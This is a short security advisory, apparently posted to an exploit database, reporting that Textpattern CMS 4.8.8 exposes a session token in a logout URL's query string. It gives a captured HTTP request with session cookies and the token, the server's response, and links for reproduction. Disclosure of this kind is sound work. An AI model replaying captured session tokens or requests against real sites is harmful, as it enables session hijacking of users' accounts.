## Title:  Vulnerability
## Author: nu11secur1ty
## Date: 05.10.2023
## Vendor: https://textpattern.com/
## Software: https://github.com/textpattern/textpattern/releases/tag/4.8.8
## Reference: https://portswigger.net/kb/issues/00500700_session-token-in-url, https://cwe.mitre.org/data/definitions/200.html

## Description:
Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing session tokens into the URL increases the risk that they will be captured by an attacker. 
Issue detail: The URL in the request appears to contain a session token within the query string:
http://pwnedhost7.com/textpattern-4.8.8/textpattern/index.php?logout=1&lang=en&_txp_token=64f17b3d874e3c5f9c728f03e1271c64

STATUS: Medium Vulnerability

[+]Exploit:
```GET
GET /textpattern-4.8.8/textpattern/index.php?logout=1&lang=en&_txp_token=64f17b3d874e3c5f9c728f03e1271c64 HTTP/1.1
Host: pwnedhost7.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://pwnedhost7.com/textpattern-4.8.8/textpattern/index.php?event=diag
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: txp_login=Admin%2C628717737574e8be05624bb2da74fb38; txp_login_public=d5f8d91942Admin
Connection: close

```
[+]Response:
```HTTP
HTTP/1.1 200 OK
Date: Wed, 10 May 2023 07:54:28 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Powered-By: PHP/7.4.30
Set-Cookie: txp_login=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; SameSite=Lax
Set-Cookie: txp_login_public=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/textpattern-4.8.8/; SameSite=Lax
Set-Cookie: txp_test_cookie=1; SameSite=Lax
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN
Content-Length: 4702
Connection: close
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex, nofollow">
<title>Log in - My site &#124; Textpattern CMS</title>
<script src="vendors/jq
```


## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/textpattern/2023/textpattern-4.8.8)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/05/textpattern-488-session-token-in-url.html)

## Time spend:
01:15:00


-- 
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>
